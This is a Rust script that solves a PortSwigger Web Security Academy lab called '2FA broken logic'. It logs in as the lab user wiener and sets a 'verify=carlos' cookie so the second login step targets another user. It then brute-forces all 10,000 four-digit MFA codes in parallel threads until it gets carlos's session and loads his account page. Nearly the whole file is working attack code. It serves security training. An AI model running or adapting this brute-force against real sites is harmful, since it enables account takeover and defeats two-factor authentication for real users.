/**********************************************************
*
* Lab: 2FA broken logic
*
* Hack Steps: 
*      1. Obtain a valid session
*      2. Fetch the login2 page
*      3. Start brute forcing the mfa-code of carlos
*      4. Fetch carlos profile
*
***********************************************************/
use lazy_static::lazy_static;
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc, Mutex,
    },
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6800ee03e72937804bfe78006800d4.web-security-academy.net";

lazy_static! {
    static ref CARLOS_SESSION: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref CARLOS_SESSION_IS_FOUND: AtomicBool = AtomicBool::new(false);
    static ref CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Obtaining a valid session.. ");
    flush_terminal();

    let login = login_as_wiener();
    let session = get_session_from_multiple_cookies(&login);

    println!("{}", "OK".green());
    print!("⦗2⦘ Fetching the login2 page.. ");

    // Must fetch the login2 page to make the mfa-code be sent to the mail server
    fetch_with_session("/login2", &session);

    println!("{}", "OK".green());
    println!("{}", "⦗3⦘ Start brute forcing the mfa-code of carlos.. ");

    let threads = 4; // You can experiment with the number of threads by adjusting this variable
    brute_force_code_in_multiple_threads(&session, threads);

    let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
    if is_found {
        print!("\n{}", "⦗4⦘ Fetching carlos profile.. ");
        let carlos_session = CARLOS_SESSION.lock().unwrap();
        fetch_with_session("/my-account", &carlos_session);
        println!("{}", "OK".green());
    } else {
        println!("\n⦗!⦘ Failed to brute force the mfa-code of carlos");
    }

    print_finish_message();
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn login_as_wiener() -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}; verify=carlos"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn brute_force_code_in_multiple_threads(session: &str, threads: i32) {
    let ranges = build_code_ranges(0, 10000, threads);
    ranges.par_iter().for_each(|range| {
        brute_force_with_range(session, range); // use every range in a different thread
    })
}

fn build_code_ranges(start: i32, end: i32, threads: i32) -> Vec<Vec<i32>> {
    let chunk_size = (end - start) / threads;
    (start..end)
        .collect::<Vec<i32>>()
        .chunks(chunk_size as usize)
        .map(|x| x.to_owned())
        .collect::<Vec<Vec<i32>>>()
}

fn brute_force_with_range(session: &str, range: &Vec<i32>) {
    for code in range {
        let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
        if is_found {
            return; // exist from the thread if the correct code is found and you have obtained the session
        } else {
            let counter = CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
            if let Ok(response) = post_code(&session, code) {
                if response.status().as_u16() == 302 {
                    print_correct_code(code);
                    let new_session = get_session_cookie(&response);
                    CARLOS_SESSION_IS_FOUND.fetch_or(true, Ordering::Relaxed);
                    CARLOS_SESSION.lock().unwrap().push_str(&new_session);
                    return;
                } else {
                    print_progress(counter, code);
                }
            } else {
                print_failed_code(code);
            }
        }
    }
}

fn post_code(session: &str, code: &i32) -> Result<Response, Error> {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login2"))
        .header("Cookie", format!("session={session}; verify=carlos"))
        .form(&HashMap::from([("mfa-code", format!("{code:04}"))]))
        .send()
}

fn get_session_from_multiple_cookies(response: &Response) -> String {
    let headers = response.headers();
    let mut cookies = headers.get_all("set-cookie").iter();
    let session_cookie = cookies.nth(1).unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", session_cookie)
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn print_correct_code(code: &i32) {
    println!("\n🗹 Correct Code: {}", format!("{code:04}").green());
    flush_terminal();
}

fn print_progress(counter: usize, code: &i32) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    print!(
        "\r❯❯ Elapsed: {} minutes || Trying ({}/10000) {} => {}",
        elapsed_time.yellow(),
        counter + 1,
        format!("{code:04}").blue(),
        "Wrong".red()
    );
    flush_terminal();
}

fn print_failed_code(code: &i32) {
    println!(
        "\n{} {}",
        "⦗!⦘ Failed to try code:".red(),
        format!("{:04}", code).red(),
    );
    flush_terminal();
}

fn print_finish_message() {
    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    println!("🗹 Finished in: {} minutes", elapased_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
